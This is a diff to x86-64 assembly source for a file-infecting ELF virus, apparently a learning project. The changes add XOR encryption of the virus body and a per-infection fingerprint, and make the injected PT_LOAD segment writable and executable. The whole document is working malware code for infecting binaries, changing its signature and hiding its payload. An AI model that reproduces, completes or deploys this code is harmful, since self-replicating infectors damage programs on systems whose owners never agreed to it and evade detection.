@@ -3,9 +3,6 @@
 section.text:
 	global _start
 
-; TODO:
-; - better fingerprint
-
 ; -== Optimization ==-
 ;-> Save bytes:
 ;	mov x, 1 => 5 bytes
@@ -128,6 +125,7 @@ _h3ll0w0rld:
 	jnz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .happy_mix
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
+		; TODO: check with huge file + PT_LOAD
 		push rdx
 		lea rdi, [rel _start]
 		mov rsi, [rel entry_inject]
@@ -140,12 +138,22 @@ _h3ll0w0rld:
 		pop rax ; mprotect
 		syscall; change protect from file to _eof
 
+		lea rdi, [rel fingerprint]
+		call _ft_strlen
+		push rax
+		pop rcx
+		push rdi
+
 		lea rdi, [rel _virus]
 		mov rdx, rdi
 		lea rsi, [rel _params]
 		sub rdx, rsi
 		mov rsi, [rel length]
 		sub rsi, rdx ; length - (_virus - _params)
+		pop rdx
+
+		call _xor_encrypt
+
 		lea rdx, [rel _h3ll0w0rld]
 		mov rcx, KEY_SIZE
 		call _xor_encrypt
@@ -308,6 +316,16 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	pop rbx
 	pop r9
 	pop r8
+ret
+
+_ft_strlen:; (string rdi)
+	xor rax, rax; = 0
+	.loop_char:
+		cmp byte [rdi + rax], 0
+		jz .return
+		inc rax
+	jmp .loop_char
+	.return:
 ret
 
 _virus:
@@ -928,7 +946,7 @@ _infect_file: ; (string rdi, stat rsi)
 			pop r13
 			add rbx, r13
 			mov dword[rbx], PT_LOAD; PT_LOAD
-			mov dword[rbx + phdr.p_flags], 5; PF_X | PF_R
+			mov dword[rbx + phdr.p_flags], 7; PF_X | PF_R
 			mov rax, [r12 + ST_SIZE]
 			mov [rbx + phdr.p_offset], rax
 			xor rdx, rdx
@@ -1102,6 +1120,17 @@ _infect:
 	sub rax, rcx
 
 	push rdi
+	; change fingerprint
+	lea rdi, [rel _params]
+	lea rcx, [rel fingerprint]
+	sub rcx, rdi
+	mov rdi, rax
+	add rdi, rcx
+	push rax
+	call _update_fingerprint
+	pop rax
+	push rdi
+
 	mov rdi, rax
 	push rax
 	lea rcx, [rel _virus]
@@ -1114,18 +1143,36 @@ _infect:
 	lea rdx, [rel _h3ll0w0rld]
 	mov rcx, KEY_SIZE
 	call _xor_encrypt
-	pop rdx
-	pop rax
 
-	; change fingerprint
+	pop rcx
+	pop rax
+	pop rdx
+	push rax
+	push rcx
+
+	push rdi
+	lea rdi, [rel fingerprint]
+	call _ft_strlen
+
 	lea rdi, [rel _params]
 	lea rcx, [rel fingerprint]
 	sub rcx, rdi
 	mov rdi, rax
 	add rdi, rcx
+
 	push rax
-	call _update_fingerprint
+	pop rcx
+	pop rdi
+;	rdi ok
+;	rsi ok
+;	rdx ok
+;	rcx ok
+
+	call _xor_encrypt
+
+	pop rdx
 	pop rax
+
 	pop rdi
 	pop rcx
 
@@ -1332,16 +1379,6 @@ _ft_isnum:; (string rdi) ; 0 no - otherwise rax something else
 	jmp .loop_char
 	.isnotnum:
 		xor rax, rax
-	.return:
-ret
-
-_ft_strlen:; (string rdi)
-	xor rax, rax; = 0
-	.loop_char:
-		cmp byte [rdi + rax], 0
-		jz .return
-		inc rax
-	jmp .loop_char
 	.return:
 ret
 
